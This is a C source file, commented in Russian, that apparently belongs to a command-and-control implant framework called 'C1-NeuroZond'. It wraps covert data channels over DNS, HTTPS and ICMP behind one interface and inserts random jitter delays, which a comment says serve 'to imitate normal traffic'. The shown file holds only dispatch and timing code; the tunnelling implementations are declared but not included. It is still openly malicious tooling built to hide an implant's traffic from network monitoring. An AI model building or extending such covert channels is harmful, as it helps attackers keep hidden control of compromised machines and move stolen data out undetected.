/**
 * @file covert_channel.c
 * @brief Модуль скрытой передачи данных для C1-NeuroZond коммуникации
 * @author iamtomasanderson@gmail.com (https://github.com/Personaz1/)
 * @date 2023-09-04
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "../network/covert_channel.h"

// Прототипы функций для DNS канала
extern CovertChannelHandle dns_channel_init(const CovertChannelConfig* config);
extern int dns_channel_connect(CovertChannelHandle handle);
extern int dns_channel_send(CovertChannelHandle handle, const unsigned char* data, size_t data_len);
extern int dns_channel_receive(CovertChannelHandle handle, unsigned char* buffer, size_t buffer_size);
extern int dns_channel_is_connected(CovertChannelHandle handle);
extern void dns_channel_cleanup(CovertChannelHandle handle);

// Прототипы функций для HTTPS канала
extern CovertChannelHandle https_channel_init(const CovertChannelConfig* config);
extern int https_channel_connect(CovertChannelHandle handle);
extern int https_channel_send(CovertChannelHandle handle, const unsigned char* data, size_t data_len);
extern int https_channel_receive(CovertChannelHandle handle, unsigned char* buffer, size_t buffer_size);
extern int https_channel_is_connected(CovertChannelHandle handle);
extern void https_channel_cleanup(CovertChannelHandle handle);

// Прототипы функций для ICMP канала
extern CovertChannelHandle icmp_channel_init(const CovertChannelConfig* config);
extern int icmp_channel_connect(CovertChannelHandle handle);
extern int icmp_channel_send(CovertChannelHandle handle, const unsigned char* data, size_t data_len);
extern int icmp_channel_receive(CovertChannelHandle handle, unsigned char* buffer, size_t buffer_size);
extern int icmp_channel_is_connected(CovertChannelHandle handle);
extern void icmp_channel_cleanup(CovertChannelHandle handle);

/**
 * @brief Структура контекста скрытого канала связи
 */
typedef struct {
    ChannelType type;                 // Тип используемого канала
    CovertChannelHandle impl_handle;  // Дескриптор конкретной реализации
    unsigned int jitter_min;          // Минимальное значение случайной задержки в мс
    unsigned int jitter_max;          // Максимальное значение случайной задержки в мс
    int is_connected;                 // Флаг установленного соединения
} CovertChannelContext;

/**
 * @brief Инициализация генератора случайных чисел
 */
static void init_random() {
    static int initialized = 0;
    if (!initialized) {
        srand((unsigned int)time(NULL));
        initialized = 1;
    }
}

/**
 * @brief Получить случайное значение задержки в диапазоне jitter_min...jitter_max
 * 
 * @param context Контекст канала связи
 * @return unsigned int Величина задержки в миллисекундах
 */
static unsigned int get_jitter_delay(CovertChannelContext* context) {
    if (context->jitter_max <= context->jitter_min) {
        return context->jitter_min;
    }
    
    unsigned int range = context->jitter_max - context->jitter_min;
    return context->jitter_min + (rand() % (range + 1));
}

/**
 * @brief Инициализация скрытого канала связи
 * 
 * @param config Конфигурация канала связи
 * @return CovertChannelHandle Дескриптор канала связи или NULL в случае ошибки
 */
CovertChannelHandle covert_channel_init(const CovertChannelConfig* config) {
    if (!config || !config->server_address) {
        return NULL;
    }

    init_random();
    
    CovertChannelContext* context = (CovertChannelContext*)malloc(sizeof(CovertChannelContext));
    if (!context) {
        return NULL;
    }
    
    memset(context, 0, sizeof(CovertChannelContext));
    context->type = config->channel_type;
    context->jitter_min = config->jitter_min > 0 ? config->jitter_min : DEFAULT_JITTER_MIN;
    context->jitter_max = config->jitter_max > context->jitter_min ? config->jitter_max : context->jitter_min + DEFAULT_JITTER_RANGE;
    context->is_connected = 0;
    
    switch (config->channel_type) {
        case CHANNEL_DNS:
            context->impl_handle = dns_channel_init(config);
            break;
        case CHANNEL_HTTPS:
            context->impl_handle = https_channel_init(config);
            break;
        case CHANNEL_ICMP:
            context->impl_handle = icmp_channel_init(config);
            break;
        default:
            free(context);
            return NULL;
    }
    
    if (!context->impl_handle) {
        free(context);
        return NULL;
    }
    
    return (CovertChannelHandle)context;
}

/**
 * @brief Установить соединение по скрытому каналу связи
 * 
 * @param handle Дескриптор канала связи
 * @return int 0 при успехе, отрицательное значение при ошибке
 */
int covert_channel_connect(CovertChannelHandle handle) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context || !context->impl_handle) {
        return -1;
    }
    
    int result;
    switch (context->type) {
        case CHANNEL_DNS:
            result = dns_channel_connect(context->impl_handle);
            break;
        case CHANNEL_HTTPS:
            result = https_channel_connect(context->impl_handle);
            break;
        case CHANNEL_ICMP:
            result = icmp_channel_connect(context->impl_handle);
            break;
        default:
            return -1;
    }
    
    if (result == 0) {
        context->is_connected = 1;
    }
    
    return result;
}

/**
 * @brief Отправить данные по скрытому каналу связи
 * 
 * @param handle Дескриптор канала связи
 * @param data Буфер с данными для отправки
 * @param data_len Размер буфера с данными
 * @return int Количество отправленных байт или отрицательное значение при ошибке
 */
int covert_channel_send(CovertChannelHandle handle, const unsigned char* data, size_t data_len) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context || !context->impl_handle || !data || data_len == 0) {
        return -1;
    }
    
    // Добавляем случайную задержку для имитации нормального трафика
    unsigned int delay = get_jitter_delay(context);
    if (delay > 0) {
        // В миллисекундах
        struct timespec ts;
        ts.tv_sec = delay / 1000;
        ts.tv_nsec = (delay % 1000) * 1000000;
        nanosleep(&ts, NULL);
    }
    
    int result;
    switch (context->type) {
        case CHANNEL_DNS:
            result = dns_channel_send(context->impl_handle, data, data_len);
            break;
        case CHANNEL_HTTPS:
            result = https_channel_send(context->impl_handle, data, data_len);
            break;
        case CHANNEL_ICMP:
            result = icmp_channel_send(context->impl_handle, data, data_len);
            break;
        default:
            return -1;
    }
    
    return result;
}

/**
 * @brief Получить данные по скрытому каналу связи
 * 
 * @param handle Дескриптор канала связи
 * @param buffer Буфер для принимаемых данных
 * @param buffer_size Размер буфера
 * @return int Количество принятых байт или отрицательное значение при ошибке
 */
int covert_channel_receive(CovertChannelHandle handle, unsigned char* buffer, size_t buffer_size) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context || !context->impl_handle || !buffer || buffer_size == 0) {
        return -1;
    }
    
    // Добавляем случайную задержку для имитации нормального трафика
    unsigned int delay = get_jitter_delay(context);
    if (delay > 0) {
        // В миллисекундах
        struct timespec ts;
        ts.tv_sec = delay / 1000;
        ts.tv_nsec = (delay % 1000) * 1000000;
        nanosleep(&ts, NULL);
    }
    
    int result;
    switch (context->type) {
        case CHANNEL_DNS:
            result = dns_channel_receive(context->impl_handle, buffer, buffer_size);
            break;
        case CHANNEL_HTTPS:
            result = https_channel_receive(context->impl_handle, buffer, buffer_size);
            break;
        case CHANNEL_ICMP:
            result = icmp_channel_receive(context->impl_handle, buffer, buffer_size);
            break;
        default:
            return -1;
    }
    
    return result;
}

/**
 * @brief Проверить, установлено ли соединение по скрытому каналу
 * 
 * @param handle Дескриптор канала связи
 * @return int 1 если соединение установлено, 0 если нет, -1 при ошибке
 */
int covert_channel_is_connected(CovertChannelHandle handle) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context || !context->impl_handle) {
        return -1;
    }
    
    if (!context->is_connected) {
        return 0;
    }
    
    int result;
    switch (context->type) {
        case CHANNEL_DNS:
            result = dns_channel_is_connected(context->impl_handle);
            break;
        case CHANNEL_HTTPS:
            result = https_channel_is_connected(context->impl_handle);
            break;
        case CHANNEL_ICMP:
            result = icmp_channel_is_connected(context->impl_handle);
            break;
        default:
            return -1;
    }
    
    // Обновляем внутреннее состояние
    context->is_connected = (result == 1);
    
    return result;
}

/**
 * @brief Установить параметры джиттера (случайной задержки) для канала
 * 
 * @param handle Дескриптор канала связи
 * @param min_ms Минимальное значение задержки в мс
 * @param max_ms Максимальное значение задержки в мс
 * @return int 0 при успехе, отрицательное значение при ошибке
 */
int covert_channel_set_jitter(CovertChannelHandle handle, unsigned int min_ms, unsigned int max_ms) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context) {
        return -1;
    }
    
    if (max_ms < min_ms) {
        return -1;
    }
    
    context->jitter_min = min_ms;
    context->jitter_max = max_ms;
    
    return 0;
}

/**
 * @brief Освободить ресурсы, выделенные для скрытого канала связи
 * 
 * @param handle Дескриптор канала связи
 */
void covert_channel_cleanup(CovertChannelHandle handle) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context) {
        return;
    }
    
    if (context->impl_handle) {
        switch (context->type) {
            case CHANNEL_DNS:
                dns_channel_cleanup(context->impl_handle);
                break;
            case CHANNEL_HTTPS:
                https_channel_cleanup(context->impl_handle);
                break;
            case CHANNEL_ICMP:
                icmp_channel_cleanup(context->impl_handle);
                break;
            default:
                break;
        }
    }
    
    free(context);
} 